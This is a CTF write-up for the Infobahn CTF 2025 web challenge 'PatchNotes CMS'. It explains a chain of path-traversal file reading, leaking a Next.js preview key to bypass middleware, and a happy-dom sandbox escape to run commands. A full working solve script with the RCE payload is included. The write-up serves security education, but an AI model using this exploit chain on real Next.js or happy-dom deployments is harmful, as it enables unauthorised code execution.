# PatchNotes CMS

|              |                                                                                             |
| ------------ | ------------------------------------------------------------------------------------------- |
| **CTF**      | [Infobahn CTF 2025](http://2025.infobahnc.tf/) [(CTFtime)](https://ctftime.org/event/2878/) |
| **Author**   | [0xM4hm0ud](https://github.com/0xM4hm0ud) && [Yuu](https://github.com/anzuukino)            |
| **Category** | web                                                                                         |
| **Solves**   | 237                                                                                         |
| **Files**    | [patchnotes.zip](./patchnotes.zip)                                                          |

# Solution

### Patchnotes CMS (unintended)

Something went wrong with the permission on the `flag.txt` file. Players used the LFI vulnerability to read the flag.txt

### Patchnotes CMS Revenge (intended)

- We have an LFI vulnerability where we can only read `.txt` and `.json` files. Leak `PreviewModeId` from `/app/.next/prerender-manifest.json`.
- Middleware can be bypassed with the header `X-Prerender-Revalidate` and the key we leaked in the first step.
- RCE with happy-dom RCE <https://github.com/advisories/GHSA-37j7-fg3j-429f>

The reason why:
<https://github.com/vercel/next.js/blob/c274a5161845a21f32f9bf797a157a7d245cdf02/packages/next/src/server/next-server.ts#L1645C7-L1645C32>
<https://github.com/vercel/next.js/blob/canary/packages/next/src/server/api-utils/index.ts#L89>

[solve.py](./solve.py):

```py
import requests

URL = "https://patchnotes-web.challs3.infobahnc.tf/"

def fetch_preview_id():
    file_path = "../../../../app/.next/prerender-manifest.json"
    response = requests.get(URL + "/api/notes/read?file=" +file_path)
    preview_id = response.json()["json"]["preview"]["previewModeId"]
    return preview_id

def get_flag():
    cmd = "/readflag > /tmp/data/flag.json"
    payload = f"<script> const process = this.constructor.constructor('return process')(); const require = process.mainModule.require; console.log('Files:', require('child_process').execSync('{cmd}')); </script>"
    data = {
        "file": "patch-1.0.3.json",
        "content": payload,
    }
    requests.post(URL + f"/api/notes/save", json=data)
    header = {
        "X-Prerender-Revalidate": fetch_preview_id()
    }
    requests.post(URL + f"/admin/api/preview", json={"file": "patch-1.0.3.json"}, headers=header)
    flag_response = requests.get(URL + "/api/notes/read?file=flag.json")
    print("Flag:", flag_response.json()["content"])

if __name__ == "__main__":
    get_flag()
```
